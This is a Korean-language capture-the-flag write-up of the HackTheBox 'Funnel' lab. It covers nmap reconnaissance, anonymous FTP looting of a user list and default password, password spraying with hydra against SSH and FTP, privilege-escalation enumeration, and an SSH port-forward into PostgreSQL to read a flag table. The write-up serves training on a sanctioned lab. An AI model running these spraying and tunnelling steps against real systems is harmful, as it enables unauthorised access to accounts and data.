# Funnel - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 21,22 -sC -sV -vv -oA funnel 10.129.7.153
```
<img width="1107" height="603" alt="image" src="https://github.com/user-attachments/assets/d93f2a2e-fa52-420e-8da2-a9382d5f620e" />

- FTP(21)
- SSH(22)

---
## FTP
- `anonymous`로 로그인하여 내부 파일들을 모두 다운로드 받아줌.
```bash
ftp 10.129.7.159
```
<img width="1107" height="596" alt="image" src="https://github.com/user-attachments/assets/c6b62d26-4af9-46c2-891c-57ff3ac7f47f" />

<br>
<br>

- `welcome_28112022`파일에서 유저들을 수집할 수 있음.
<img width="1107" height="320" alt="image" src="https://github.com/user-attachments/assets/d9d540fc-8af8-4fb7-9652-fedef5f75f8e" />

<br>
<br>

- `password_policy.pdf`파일에서 기본설정 비밀번호를 수집할 수 있음.
<img width="996" height="102" alt="image" src="https://github.com/user-attachments/assets/ca3f0420-7ead-4a89-8515-77ab12289f8b" />

---
## Password Spraying
- `hydra`를 사용하여 로그인이 가능한지 테스트
- `christine`이 로그인 가능한 것을 확인
```bash
hydra -L users -p 'funnel123#!#' ssh://10.129.7.159
```
<img width="1111" height="280" alt="image" src="https://github.com/user-attachments/assets/e2e35145-bf23-493a-acb2-3b04ba874ea9" />

<br>
<br>

```bash
hydra -L users -p 'funnel123#!#' ftp://10.129.7.159
```
<img width="1111" height="236" alt="image" src="https://github.com/user-attachments/assets/9eeab3c6-7841-45a1-9755-916585cddfb4" />

---
## ssh
- `christine:funnel123#!#` ssh 로그인 성공.
```bash
ssh christine@10.129.7.159
```
<img width="1111" height="44" alt="image" src="https://github.com/user-attachments/assets/b7e01408-3fa1-4429-ada2-e20c8b496165" />
<img width="1111" height="44" alt="image" src="https://github.com/user-attachments/assets/955fd6fe-3cad-4f31-aff8-f9fc25cf409a" />

<br>
<br>

- 권한상승 파일을 찾아보았으나 특별한 점은 없었음.
```bash
sudo -l

find / -perm 4000 2>/dev/null

find / -perm 6000 2>/dev/null

cat /etc/crontab
```

<br>

- 열려있는 포트를 확인하여 `5432`포트를 발견
```bash
ss -tnlp
```
<img width="1077" height="153" alt="image" src="https://github.com/user-attachments/assets/9e13f014-2f2a-48eb-a307-82e742732edf" />

---
## postgresql(5432)
- 로컬에서 postgres를 사용하기 위해 SSH를 통해서 포트포워딩을 생성.
```bash
ssh -L 5432:localhost:5432 christine@10.129.7.159
```
<img width="1105" height="118" alt="image" src="https://github.com/user-attachments/assets/ad2b0807-3745-426b-91dc-435f3f59bee5" />

<br>
<br>

- `psql`을 사용하여 ssh를 로그인한 계정과 동일한 계정을 사용하여 로그인.
<img width="1105" height="149" alt="image" src="https://github.com/user-attachments/assets/53ff95ee-e4bf-467d-8dee-0fdfd3e1c0cb" />

<br>
<br>

- database 조회
```psql
\l
```
<img width="1113" height="242" alt="image" src="https://github.com/user-attachments/assets/92f6d058-7bc3-4de7-a5b3-950173e02751" />

<br>
<br>

- `secrets`데이터베이스에 접속해서 목록 조회
- `flag`테이블을 확인하면 flag 획득
```psql
\c secrets

\d

select * from flag;
```
<img width="1107" height="182" alt="image" src="https://github.com/user-attachments/assets/d57f63b1-fc56-4c58-b934-ca791e31bc46" />








